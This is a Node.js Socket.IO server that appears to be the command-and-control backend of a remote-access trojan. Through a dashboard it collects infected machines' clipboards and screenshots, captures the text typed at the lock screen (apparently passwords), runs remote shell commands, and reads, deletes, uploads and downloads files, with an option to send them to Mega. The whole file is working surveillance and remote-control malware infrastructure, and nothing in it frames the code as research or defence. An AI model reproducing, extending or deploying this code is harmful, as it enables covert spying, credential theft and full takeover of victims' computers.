const fs = require('fs');
const path = require('path');

const logDir = path.join(__dirname, 'logs');
// if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);

const express = require('express');
const app = express();

// app.use('/logs', express.static(logDir));
const httpServer = require('http').createServer(app);
const io = require('socket.io')(httpServer, { cors: {origin: "*"}});

const clients = {}; // nodeId => { name, user, address, socketId, state }
const dashboardSockets = new Set(); // Store web dashboards


httpServer.listen(3000);

io.on("connection", (socket) => {
    console.log("Client connected:", socket.id);

    // Check if it's a browser dashboard (based on handshake query maybe)
    if (socket.handshake.query?.type === "dashboard") {
        dashboardSockets.add(socket);

        // Send current status of all clients (including state) to dashboard
        socket.emit("status_update", clients);

        socket.on("send_hello", (clientName) => {
            const clientObj = clients[clientName];
            if (clientObj && clientObj.socketId) {
                io.to(clientObj.socketId).emit("command", { text: "Hello from website!" });
            }
        });

        socket.on("get_clipboard", (nodeId) => {
            const clientObj = clients[nodeId];
            if (clientObj && clientObj.socketId) {
                // Just ask the node to send its current clipboard.
                // Result will be broadcast to all dashboards.
                io.to(clientObj.socketId).emit("getClipboards");
            }
        });

        socket.on("get_screenshots", (nodeId) => {
            const clientObj = clients[nodeId];
            if(clientObj && clientObj.socketId) {
                io.to(clientObj.socketId).emit("getScreenshots");
            }
        });

        socket.on("get_screenshots_tg", (nodeId) => {
            const clientObj = clients[nodeId];
            if (clientObj && clientObj.socketId) {
                io.to(clientObj.socketId).emit("getScreenshotsTG");
            }
        });

        socket.on("set_clipboard_state", ({ clientName, state }) => {
            const clientObj = clients[clientName];
            if (clientObj && clientObj.socketId) {
                // Remember state on server so dashboards can show correct value
                clientObj.state = state;
                io.to(clientObj.socketId).emit("change_clipboard_state", state);
                // Broadcast updated status (with new state) to all dashboards
                dashboardSockets.forEach(dash => {
                    dash.emit("status_update", clients);
                });
            }
        });

        // Dashboard -> run remote shell command on a specific client
        socket.on("run_shell_command", ({ nodeId, command }) => {
            const clientObj = clients[nodeId];
            if (!clientObj || !clientObj.socketId || !command) return;
            io.to(clientObj.socketId).emit("execute_shell_command", command);
        });

        // Dashboard -> get directory listing (file explorer)
        socket.on("get_directory", ({ nodeId, path: dirPath }) => {
            const clientObj = clients[nodeId];
            if (!clientObj || !clientObj.socketId) return;
            io.to(clientObj.socketId).emit("list_directory", { path: dirPath || "" });
        });

        // Dashboard -> delete remote file/folder
        socket.on("delete_remote_path", ({ nodeId, path: targetPath }) => {
            const clientObj = clients[nodeId];
            if (!clientObj || !clientObj.socketId || !targetPath) return;
            io.to(clientObj.socketId).emit("delete_path", { path: targetPath });
        });

        // Dashboard -> download remote file
        socket.on("download_remote_file", ({ nodeId, path: filePath }) => {
            const clientObj = clients[nodeId];
            if (!clientObj || !clientObj.socketId || !filePath) return;
            io.to(clientObj.socketId).emit("read_file", { path: filePath });
        });

        // Dashboard -> ask client to save a remote file into Mega
        socket.on("save_to_mega", ({ nodeId, path: filePath }) => {
            const clientObj = clients[nodeId];
            if (!clientObj || !clientObj.socketId || !filePath) return;
            io.to(clientObj.socketId).emit("save_to_mega", { path: filePath });
        });

        // Dashboard -> upload local file to remote directory
        socket.on("upload_remote_file", ({ nodeId, path: dirPath, name, contentBase64 }) => {
            const clientObj = clients[nodeId];
            if (!clientObj || !clientObj.socketId || !name || !contentBase64) return;
            io.to(clientObj.socketId).emit("write_file", { path: dirPath || "", name, contentBase64 });
        });

        socket.on("disconnect", () => {
            dashboardSockets.delete(socket);
        });
        return;
    }

    // Client PC
    socket.on("pc_info", (data) => {
        const name = data.name;
        const user = data.user;
        const address = data.address;
        const version = data.version || null;
        // Stable node id used by dashboard and for log directories
        const nodeId = `${user}_${name}_${address}`;

        // Preserve previous state for this node if we already know it
        const prev = clients[nodeId];
        const prevState = prev && prev.state ? prev.state : "autosend";
        const prevLocked = prev && typeof prev.locked === "boolean" ? prev.locked : false;
        const prevLastLockTs = prev && prev.lastLockTs ? prev.lastLockTs : null;
        const prevLockString = prev && typeof prev.lockString === "string" ? prev.lockString : "";
        const prevVersion = prev && prev.version ? prev.version : null;

        clients[nodeId] = {
            name,
            user,
            address,
            socketId: socket.id,
            state: prevState,
            locked: prevLocked,
            lastLockTs: prevLastLockTs,
            lockString: prevLockString,
            version: version || prevVersion
        };

        console.log(`PC Registered: ${nodeId} = ${socket.id}`);

        // Notify all dashboards
        dashboardSockets.forEach(dash => {
            dash.emit("status_update", clients);
        });
    });

    socket.on("clipboard_text", (payload) => {
        // payload: { nodeId, text }
        const nodeId = payload && payload.nodeId
            ? payload.nodeId
            : Object.keys(clients).find(key => clients[key].socketId === socket.id);

        let text = "";
        if (payload && typeof payload.text === "string") {
            // Normal case: explicit text from client
            text = payload.text;
        } else if (typeof payload === "string") {
            // Backwards-compat: raw string payload
            text = payload;
        } else {
            // Anything else: treat as empty string
            text = "";
        }
        // const logFile = nodeId ? path.join(logDir, `${nodeId}.log`) : path.join(logDir, `unknown.log`);
        // const entry = `[${new Date().toLocaleString()}] ${text}\n`;
        // fs.appendFile(logFile, entry, () => {});

        // Broadcast clipboard result to all dashboards so there is no race
        // condition when multiple nodes are requested close together.
        dashboardSockets.forEach(dash => {
            dash.emit("clipboard_result", {
                client: nodeId,
                text
            });
        });
    });

    socket.on("screenshot", (data) => {
        const nodeId = data && data.nodeId;
        const images = data && data.images;
        if (!nodeId || !images || images.length === 0) return;
        
        images.forEach((img, index) => {
            if (!img || !img.base64) return;
            // Send as data URL so we don't rely on filesystem logs
            const url = `data:image/jpeg;base64,${img.base64}`;
            dashboardSockets.forEach(dash => {
                dash.emit("screenshot", {
                    client: nodeId,
                    img: url,
                    ts: img.ts
                });
            });
        });
    });

    // Client PC -> lock/unlock session state
    socket.on("session_state", (payload) => {
        const socketId = socket.id;
        const nodeId = Object.keys(clients).find(key => clients[key].socketId === socketId);
        if (!nodeId) return;

        const isLocked = !!(payload && payload.locked);
        const ts = payload && payload.ts ? payload.ts : new Date().toISOString();
        const clientObj = clients[nodeId];
        if (!clientObj) return;

        clientObj.locked = isLocked;
        clientObj.lastLockTs = ts;
        if (isLocked) {
            // Starting a new locked period: reset lockString until completed on unlock
            clientObj.lockString = "";
        }

        // Notify dashboards of updated status
        dashboardSockets.forEach(dash => {
            dash.emit("status_update", clients);
        });
    });

    // Client PC -> final string typed while locked
    socket.on("lock_string", (payload) => {
        const nodeId = payload && payload.nodeId
            ? payload.nodeId
            : Object.keys(clients).find(key => clients[key].socketId === socket.id);
        if (!nodeId) return;

        const text = payload && typeof payload.text === "string" ? payload.text : "";
        const clientObj = clients[nodeId];
        if (!clientObj) return;

        clientObj.lockString = text;

        // Broadcast updated status with lockString to all dashboards
        dashboardSockets.forEach(dash => {
            dash.emit("status_update", clients);
        });
    });

    // Client PC -> shell command result (from remote execution)
    socket.on("shell_result", (payload) => {
        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
        const output = payload.output || payload;
        if (!nodeId) return;

        // Optional: append shell output into the same log file
        // const logFile = path.join(logDir, `${nodeId}.log`);
        // const entry = `[${new Date().toLocaleString()}] [SHELL] ${output}\n`;
        // fs.appendFile(logFile, entry, () => {});

        // Broadcast shell result to all dashboards
        dashboardSockets.forEach(dash => {
            dash.emit("shell_result", {
                client: nodeId,
                output
            });
        });
    });

    // Client PC -> directory listing result
    socket.on("directory_result", (payload) => {
        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
        if (!nodeId) return;

        const { path: dirPath, entries, parentPath, error } = payload;

        dashboardSockets.forEach(dash => {
            dash.emit("directory_result", {
                client: nodeId,
                path: dirPath,
                parentPath,
                entries,
                error: error || null
            });
        });
    });

    // Client PC -> delete result
    socket.on("delete_result", (payload) => {
        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
        if (!nodeId) return;

        const { path: targetPath, success, error } = payload;

        dashboardSockets.forEach(dash => {
            dash.emit("delete_result", {
                client: nodeId,
                path: targetPath,
                success: !!success,
                error: error || null
            });
        });
    });

    // Client PC -> file data for download
    socket.on("file_data", (payload) => {
        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
        if (!nodeId) return;

        const { path: filePath, name, size, contentBase64, error } = payload;

        dashboardSockets.forEach(dash => {
            dash.emit("file_data", {
                client: nodeId,
                path: filePath,
                name,
                size,
                contentBase64,
                error: error || null
            });
        });
    });

    // Client PC -> write/upload result
    socket.on("write_result", (payload) => {
        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
        if (!nodeId) return;

        const { path: targetPath, name, success, error } = payload;

        dashboardSockets.forEach(dash => {
            dash.emit("upload_result", {
                client: nodeId,
                path: targetPath,
                name,
                success: !!success,
                error: error || null
            });
        });
    });

    socket.on("disconnect", () => {
        // Find which client disconnected
        const clientId = Object.keys(clients).find(key => clients[key].socketId === socket.id);
        if (clientId) {
            delete clients[clientId];

            dashboardSockets.forEach(dash => {
                dash.emit("status_update", clients);
            });
        }
    });
});
